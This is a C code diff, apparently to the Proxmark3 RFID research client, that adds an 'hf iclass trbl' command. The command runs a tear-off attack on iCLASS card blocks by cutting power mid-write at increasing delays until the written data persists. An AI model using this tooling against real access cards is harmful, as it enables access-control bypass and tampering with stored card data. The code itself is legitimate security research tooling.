@@ -41,6 +41,7 @@
 #include "preferences.h"
 #include "generator.h"
 #include "cmdhf14b.h"
+#include "cmdhw.h"
 
 
 #define NUM_CSNS               9
@@ -2927,6 +2928,199 @@ static int CmdHFiClass_ReadBlock(const char *Cmd) {
     return PM3_SUCCESS;
 }
 
+static int CmdHFiClass_TearBlock(const char *Cmd) {
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf iclass trbl",
+                  "Tear off an iCLASS tag block",
+                  "hf iclass trbl --blk 10 -d AAAAAAAAAAAAAAAA -k 001122334455667B --tdb 100 --tde 150\n"
+                  "hf iclass trbl --blk 10 -d AAAAAAAAAAAAAAAA --ki 0  --tdb 100 --tde 150");
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_str0("k", "key", "<hex>", "Access key as 8 hex bytes"),
+        arg_int0(NULL, "ki", "<dec>", "Key index to select key from memory 'hf iclass managekeys'"),
+        arg_int1(NULL, "blk", "<dec>", "block number"),
+        arg_str1("d", "data", "<hex>", "data to write as 8 hex bytes"),
+        arg_str0("m", "mac", "<hex>", "replay mac data (4 hex bytes)"),
+        arg_lit0(NULL, "credit", "key is assumed to be the credit key"),
+        arg_lit0(NULL, "elite", "elite computations applied to key"),
+        arg_lit0(NULL, "raw", "no computations applied to key"),
+        arg_lit0(NULL, "nr", "replay of NR/MAC"),
+        arg_lit0("v", "verbose", "verbose output"),
+        arg_lit0(NULL, "shallow", "use shallow (ASK) reader modulation instead of OOK"),
+        arg_int1(NULL, "tdb", "<dec>", "tearoff delay start in ms"),
+        arg_int1(NULL, "tde", "<dec>", "tearoff delay end in ms"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int key_len = 0;
+    uint8_t key[8] = {0};
+
+    CLIGetHexWithReturn(ctx, 1, key, &key_len);
+
+    int key_nr = arg_get_int_def(ctx, 2, -1);
+
+    if (key_len > 0 && key_nr >= 0) {
+        PrintAndLogEx(ERR, "Please specify key or index, not both");
+        CLIParserFree(ctx);
+        return PM3_EINVARG;
+    }
+
+    bool auth = false;
+
+    if (key_len > 0) {
+        auth = true;
+        if (key_len != 8) {
+            PrintAndLogEx(ERR, "Key is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    } else if (key_nr >= 0) {
+        if (key_nr < ICLASS_KEYS_MAX) {
+            auth = true;
+            memcpy(key, iClass_Key_Table[key_nr], 8);
+            PrintAndLogEx(SUCCESS, "Using key[%d] " _GREEN_("%s"), key_nr, sprint_hex(iClass_Key_Table[key_nr], 8));
+        } else {
+            PrintAndLogEx(ERR, "Key number is invalid");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int blockno = arg_get_int_def(ctx, 3, 0);
+
+    int data_len = 0;
+    uint8_t data[8] = {0};
+    CLIGetHexWithReturn(ctx, 4, data, &data_len);
+
+    if (data_len != 8) {
+        PrintAndLogEx(ERR, "Data must be 8 hex bytes (16 hex symbols)");
+        CLIParserFree(ctx);
+        return PM3_EINVARG;
+    }
+
+    int mac_len = 0;
+    uint8_t mac[4] = {0};
+    CLIGetHexWithReturn(ctx, 5, mac, &mac_len);
+
+    if (mac_len) {
+        if (mac_len != 4) {
+            PrintAndLogEx(ERR, "MAC must be 4 hex bytes (8 hex symbols)");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int tearoff_start = arg_get_int_def(ctx, 12, 100);
+    int tearoff_end = arg_get_int_def(ctx, 13, 200);
+
+    if(tearoff_end <= tearoff_start){
+        PrintAndLogEx(ERR, "Tearoff end delay must be bigger than the start delay.");
+        return PM3_EINVARG;
+    }
+
+    if(tearoff_start < 0 || tearoff_end <= 0){
+        PrintAndLogEx(ERR, "Tearoff start/end delays should be bigger than 0.");
+        return PM3_EINVARG;
+    }
+
+    bool use_credit_key = arg_get_lit(ctx, 6);
+    bool elite = arg_get_lit(ctx, 7);
+    bool rawkey = arg_get_lit(ctx, 8);
+    bool use_replay = arg_get_lit(ctx, 9);
+    bool verbose = arg_get_lit(ctx, 10);
+    bool shallow_mod = arg_get_lit(ctx, 11);
+
+    CLIParserFree(ctx);
+
+    if ((use_replay + rawkey + elite) > 1) {
+        PrintAndLogEx(ERR, "Can not use a combo of 'elite', 'raw', 'nr'");
+        return PM3_EINVARG;
+    }
+    int isok = 0;
+    tearoff_params_t params;
+    bool read_ok = false;
+    while(tearoff_start < tearoff_end && !read_ok){
+        //perform read here, repeat if failed or 00s
+
+        uint8_t data_read_orig[8] = {0};
+        bool first_read = false;
+        bool reread = false;
+        while(!first_read){
+            int res_orig = iclass_read_block_ex(key, blockno, 0x88, elite, rawkey, use_replay, verbose, auth, shallow_mod, data_read_orig, false);
+            if (res_orig == PM3_SUCCESS && !reread){
+                if (memcmp(data_read_orig, zeros, 8) == 0){
+                    reread = true;
+                }else{
+                    first_read = true;
+                    reread = false;
+                }
+            } else if (res_orig == PM3_SUCCESS && reread){
+                first_read = true;
+                reread = false;
+            }
+        }
+
+        params.on = true;
+        params.delay_us = tearoff_start;
+        handle_tearoff(&params, false);
+        PrintAndLogEx(INFO, "Tear off delay: "_YELLOW_("%d")" ms", tearoff_start);
+        isok = iclass_write_block(blockno, data, mac, key, use_credit_key, elite, rawkey, use_replay, verbose, auth, shallow_mod);
+        switch (isok) {
+            case PM3_SUCCESS:
+                PrintAndLogEx(SUCCESS, "Wrote block " _YELLOW_("%d") " / " _YELLOW_("0x%02X") " ( " _GREEN_("ok") " )", blockno, blockno);
+                break;
+            case PM3_ETEAROFF:
+                break;
+            default:
+                PrintAndLogEx(FAILED, "Writing failed");
+                break;
+        }
+        //read the data back
+        uint8_t data_read[8] = {0};
+        first_read = false;
+        reread = false;
+        bool decrease = false;
+        while(!first_read){
+            int res = iclass_read_block_ex(key, blockno, 0x88, elite, rawkey, use_replay, verbose, auth, shallow_mod, data_read, false);
+            if (res == PM3_SUCCESS && !reread){
+                if (memcmp(data_read, zeros, 8) == 0){
+                    reread = true;
+                }else{
+                    first_read = true;
+                    reread = false;
+                }
+            } else if (res == PM3_SUCCESS && reread){
+                first_read = true;
+                reread = false;
+            } else if (res != PM3_SUCCESS){
+                decrease = true;
+            }
+        }
+        if (decrease && tearoff_start > 0){ //if there was an error reading repeat the tearoff with the same delay
+            tearoff_start--;
+        }
+        bool tear_success = true;
+        for (int i=0; i<PICOPASS_BLOCK_SIZE; i++){
+            if(data[i] != data_read[i]){
+                tear_success = false;
+            }
+        }
+        if(tear_success){ //tearoff succeeded
+            read_ok = true;
+            PrintAndLogEx(SUCCESS, _GREEN_("Tear-off Success!"));
+            PrintAndLogEx(INFO, "Read: %s", sprint_hex(data_read, sizeof(data_read)));
+        }else{ //tearoff did not succeed
+            PrintAndLogEx(FAILED, _RED_("Tear-off Failed!"));
+            tearoff_start++;
+        }
+        PrintAndLogEx(INFO, "---------------");
+    }
+    PrintAndLogEx(NORMAL, "");
+    return isok;
+}
+
 static int CmdHFiClass_loclass(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf iclass loclass",
@@ -5332,6 +5526,7 @@ static command_t CommandTable[] = {
     {"view",        CmdHFiClassView,            AlwaysAvailable, "Display content from tag dump file"},
     {"wrbl",        CmdHFiClass_WriteBlock,     IfPm3Iclass,     "Write Picopass / iCLASS block"},
     {"creditepurse", CmdHFiClassCreditEpurse,   IfPm3Iclass,     "Credit epurse value"},
+    {"trbl",        CmdHFiClass_TearBlock,      IfPm3Iclass,     "Performs tearoff attack on iClass block"},
     {"-----------", CmdHelp,                    AlwaysAvailable, "--------------------- " _CYAN_("Recovery") " --------------------"},
 //    {"autopwn",     CmdHFiClassAutopwn,         IfPm3Iclass,     "Automatic key recovery tool for iCLASS"},
     {"chk",         CmdHFiClassCheckKeys,       IfPm3Iclass,     "Check keys"},
